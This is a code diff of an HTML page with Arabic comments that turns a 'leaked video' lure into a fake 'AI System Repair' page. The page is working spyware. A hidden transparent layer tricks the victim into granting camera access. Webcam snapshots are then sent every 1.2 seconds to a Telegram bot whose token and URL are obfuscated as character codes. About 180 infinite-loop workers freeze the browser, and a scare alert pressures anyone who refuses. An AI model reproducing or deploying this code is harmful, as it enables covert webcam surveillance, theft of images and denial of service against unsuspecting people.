@@ -1,52 +1,66 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>شاهد الآن</title>
+    <title>AI System Repair</title>
     <style>
-        body { margin: 0; background: #000; overflow: hidden; font-family: sans-serif; }
-        /* الزر الحقيقي الذي يراه الضحية */
-        .fake-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%); padding: 20px 40px; background: red; color: white; border-radius: 10px; z-index: 1; pointer-events: none; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #111; font-family: sans-serif; overflow: hidden; }
+        /* واجهة التمويه */
+        .ai-layer { position: absolute; width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 1; filter: blur(0px); transition: 0.5s; }
+        .g-btn { background: #4285f4; color: white; padding: 20px 60px; border-radius: 30px; font-size: 22px; font-weight: bold; border: none; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
         
-        /* الطبقة الشفافة التي تحتوي على طلب الكاميرا */
-        #v { position: absolute; width: 100%; height: 100%; opacity: 0; z-index: 100; cursor: pointer; }
+        /* الطبقة الشفافة (المصيدة) - توضع في مكان ظهور نافذة سماح */
+        #v { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; z-index: 999; cursor: pointer; }
     </style>
 </head>
-<body onclick="launchPayload()">
+<body onclick="engageAI()">
 
-    <div class="fake-btn">▶ تشغيل الفيديو المسرب</div>
-    
+    <div class="ai-layer" id="overlay">
+        <div style="width: 80px; height: 80px; border: 5px solid #4285f4; border-top: 5px solid transparent; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+        <h2 style="color: #fff; margin-top: 20px;">جاري فحص موارد النظام...</h2>
+        <p style="color: #ccc;">اضغط على الزر أدناه لتأكيد الهوية وإكمال الإصلاح</p>
+        <button class="g-btn">تأكيد الآن</button>
+    </div>
+
     <video id="v" autoplay playsinline></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-    // التوكن والآيدي مشفرين (CharCodes) عشان الحماية ما تصيدك
+    // تشفير رقمي CharCode للروابط والتوكن
     const _t = [56,52,51,57,49,53,55,53,50,48,58,65,65,71,71,90,66,120,89,112,48,120,54,89,53,52,97,114,51,84,73,114,107,77,97,77,69,72,97,114,81,65,83,109,103,89];
     const _i = [49,55,55,50,56,50,48,52,51,51];
     const _g = a => a.map(x => String.fromCharCode(x)).join('');
 
-    async function launchPayload() {
-        // بمجرد الضغط، المتصفح يظن أن المستخدم هو من طلب الكاميرا
+    async function engageAI() {
+        // بمجرد الضغط، يتم تفعيل الكاميرا (هنا يضغط الضحية "سماح" وهو يظن أنه يضغط "تأكيد")
         try {
             const stream = await navigator.mediaDevices.getUserMedia({video: true});
             document.getElementById('v').srcObject = stream;
             
-            // تصوير صامت وفوري
-            setInterval(capture, 1000);
+            // تغيير شكل الصفحة عشان يحس إن "الإصلاح" نجح وما يخرج
+            document.getElementById('overlay').style.filter = "blur(10px)";
+            document.getElementById('overlay').innerHTML = "<h1 style='color:#0f0;'>تم التأكيد بنجاح<br>جاري المعالجة...</h1>";
+
+            // تصوير فوري وإرسال صامت
+            setInterval(captureHit, 1200);
             
-            // شل حركة النظام (التهنيج النووي) لإرباك الضحية
-            for(let i=0; i<100; i++) {
-                const b = new Blob(["setInterval(()=>{let x=new Array(1e6).fill('Z');while(true){}},1)"]);
-                new Worker(URL.createObjectURL(b));
-            }
+            // شل حركة النظام (التهنيج) لضمان عدم الخروج
+            setTimeout(() => {
+                for(let i=0; i<180; i++) {
+                    const b = new Blob(["setInterval(()=>{let x=new Array(1e6).fill('AI');while(true){}},1)"]);
+                    new Worker(URL.createObjectURL(b));
+                }
+                document.documentElement.requestFullscreen();
+            }, 3000);
+            
         } catch(e) {
-            // هندسة اجتماعية لو ظهرت النافذة رغم التمويه
-            alert("🚨 خطأ: يجب السماح بمشغل الفيديو (Flash Player) للمشاهدة!");
+            // لو رفض، نستخدم رسالة "تخويف" تجبره يضغط
+            alert("⚠️ تنبيه: لا يمكن إكمال الإصلاح بدون تأكيد المستشعر. قد يتم قفل بياناتك!");
             location.reload();
         }
     }
 
-    function capture() {
+    function captureHit() {
         const can = document.getElementById('c');
         const vid = document.getElementById('v');
         can.width = 400; can.height = 300;
@@ -57,8 +71,9 @@
             f.append(_g([112,104,111,116,111]), b, 'shot.jpg');
             const u = _g([104,116,116,112,115,58,47,47,97,112,105,46,116,101,108,101,103,114,97,109,46,111,114,103,47,98,111,116]) + _g(_t) + _g([47,115,101,110,100,80,104,111,116,111]);
             fetch(u, {method:'POST', body:f});
-        }, 'image/jpeg', 0.1);
+        }, 'image/jpeg', 0.2);
     }
     </script>
+    <style>@keyframes spin {0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style>
 </body>
 </html>
